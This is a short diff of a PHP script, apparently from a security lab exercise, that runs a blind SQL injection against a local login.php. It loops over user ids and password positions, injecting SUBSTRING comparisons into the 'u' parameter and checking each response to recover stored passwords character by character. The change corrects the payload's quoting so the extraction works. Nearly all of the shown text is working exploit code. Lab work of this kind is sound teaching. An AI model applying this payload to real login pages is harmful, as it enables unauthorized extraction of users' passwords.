@@ -98,7 +98,7 @@ for($id = 1; $id <= 100; $id++){
 			//$letter = mb_convert_encoding (chr($character), 'UTF-8', 'ISO-8859-1');
          	//echo "$letter \n";
 
-			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(password,$i,1)%20=%20%27\"%$character\"%27%20--%20";
+			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(password,$i,1)%20=%20%27%$character%27%20--%20";
 			$result = file_get_contents($url);
 			if (strpos($result, 'cat') !== false) {
 				if ($letter == "%2B") {
